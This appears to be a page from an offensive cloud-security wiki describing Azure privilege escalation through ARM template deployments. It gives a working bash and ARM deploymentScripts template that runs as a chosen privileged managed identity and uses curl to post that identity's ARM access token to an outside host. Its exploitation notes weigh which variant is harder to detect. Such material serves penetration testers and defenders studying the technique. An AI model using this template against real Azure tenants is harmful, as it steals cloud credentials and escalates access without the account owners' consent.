---
title: "Deployment template: run as a privileged identity through an ARM deployment"
description: "Deploying an ARM template or deploymentScripts resource that runs as a privileged managed identity through Microsoft.Resources/deployments/write."
keywords:
  - ARM template
  - deployments write
  - deploymentScripts
  - managed identity
  - privilege escalation
---

# Deployment template

`Microsoft.Resources/deployments/write` lets you submit an ARM template to a resource group. Two escalation shapes follow: deploy a resource that carries a privileged managed identity and then borrow it, or deploy a **deploymentScripts** resource, which runs an arbitrary script inside a container as a user-assigned identity you nominate (the MicroBurst `Invoke-AzureDeploymentScript` technique).

## deploymentScripts running as a chosen identity

```bash
cat > ds.json <<'EOF'
{ "$schema":"https://schema.management.azure.com/schemas/2019-04-01/deploymentTemplate.json#",
  "contentVersion":"1.0.0.0",
  "resources":[{
    "type":"Microsoft.Resources/deploymentScripts","apiVersion":"2020-10-01",
    "name":"x","location":"eastus","kind":"AzureCLI",
    "identity":{"type":"UserAssigned","userAssignedIdentities":{"<privileged-uami-resource-id>":{}}},
    "properties":{"azCliVersion":"2.52.0","retentionInterval":"PT1H",
      "scriptContent":"az account get-access-token --resource https://management.azure.com/ | curl -s -X POST -d @- https://you.example"}}]}
EOF
az deployment group create -g <rg> --template-file ds.json
```

The script runs as the nominated identity and exfiltrates its ARM token.

## Exploitation notes

- `deploymentScripts` is the cleaner primitive: it needs only `deployments/write` plus the right to use the user-assigned identity, and leaves a short-lived container rather than a standing resource.
- Deploying a VM or Function with a system-assigned identity works too, but creates durable resources that are easier to spot.
- Deployments run at the resource group scope by default; `deployments/write` at subscription scope widens the blast radius.

## Tools

- **az cli** (`az deployment group create`).
- **MicroBurst** (`Invoke-AzureDeploymentScript`).

## References

- [NetSPI: maintaining access with deploymentScripts](https://www.netspi.com/blog/technical-blog/)
- [Microsoft: ARM deployment scripts](https://learn.microsoft.com/azure/azure-resource-manager/templates/deployment-script-template)
- [HackTricks Cloud: Azure privilege escalation](https://cloud.hacktricks.wiki/en/pentesting-cloud/azure-security/az-privilege-escalation/index.html)
